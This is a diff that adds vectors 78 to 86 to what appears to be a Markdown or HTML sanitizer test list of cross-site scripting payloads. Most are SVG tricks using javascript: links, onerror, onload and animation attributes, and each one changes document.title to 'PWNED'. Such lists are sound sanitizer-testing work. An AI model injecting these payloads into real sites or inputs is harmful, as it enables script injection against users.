@@ -324,3 +324,41 @@ www.example.com/"><script>document.title='PWNED'</script>
 ## Vector 77
 
 > <iframe src=javascript:document.title='PWNED'>
+
+## Vector 78
+
+<svg><a href="javascript:document.title='PWNED'"><text y="20">click</text></a></svg>
+
+## Vector 79
+
+<svg><use xlink:href="javascript:document.title='PWNED'"/></svg>
+
+## Vector 80
+
+<svg><animate attributeName="href" values="javascript:document.title='PWNED'"/></svg>
+
+## Vector 81
+
+<svg><set attributeName="onmouseover" to="document.title='PWNED'"/></svg>
+
+## Vector 82
+
+<svg><foreignObject><img src=x onerror=document.title='PWNED'></foreignObject></svg>
+
+## Vector 83
+
+<svg><style>@import url(https://example.com/x.css)</style><rect fill="url(javascript:document.title='PWNED')"/></svg>
+
+## Vector 84
+
+<svg><image href="x" onerror="document.title='PWNED'"/></svg>
+
+## Vector 85
+
+<svg><![CDATA[<img src=x onerror=document.title='PWNED'>]]></svg>
+
+## Vector 86
+
+```svg
+<svg onload="document.title='PWNED'"><script>document.title='PWNED'</script></svg>
+```
